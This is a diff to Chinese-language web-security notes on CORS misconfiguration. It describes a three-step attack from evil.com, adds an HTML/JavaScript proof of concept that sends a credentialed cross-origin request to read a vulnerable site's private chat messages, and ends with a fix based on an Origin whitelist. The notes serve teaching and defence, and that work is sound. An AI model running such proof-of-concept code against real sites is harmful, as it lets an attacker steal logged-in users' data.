@@ -255,12 +255,13 @@ Content-Type: application/xml
 
 * 使用CORS实现跨域 常见的**安全风险**
   * B.com的`Access-Control-Allow-Origin: *`可以接收并响应来自任何域的request 存在**巨大风险**. 应该设置"源域名白名单"
-* attack步骤
-  * 步骤(1)如攻击者在evil.com上编写以下JavaScript代码(实现CORS跨域)
+* CORS attack
+  * 步骤(1)如攻击者在evil.com(或被目标站CORS信任的任意域)上编写"实现CORS跨域的代码"(可参考PoC1 PoC2)
   * 步骤(2)正常用户 登录B.com
   * 步骤(3)正常用户 访问evil.com (因为B.com后端的CORS未正确配置)所以evil.com向B.com发出跨域请求得到了B.com的响应,evil获取到了B.com的数据.
 
-```
+PoC1:
+```javascript
 var invocation = new XMLHttpRequest();
 
   invocation.onreadystatechange = function() {
@@ -279,6 +280,29 @@ function cors(){
 
 cors();
 ```
+
+PoC2:
+```html
+<h2>CORS To Read the response body of a vulnerable site</h2>
+<div id="demo">
+<button type="button" onclick="cors()">XHR</button>
+</div>
+
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = document.write(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://chat.vulnerable.com/v2/get-messages?conversationId=469104576&pageSize=3", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+```
+
 
 * 使用CORS实现跨域 **安全的方案(修复方案)**
   * 业务"后端"实现`Origin`白名单,把信任的域加入`Origin`白名单. 如果HTTP request中的`Origin`不在白名单内,则对应的HTTP Response不带这2个Header.
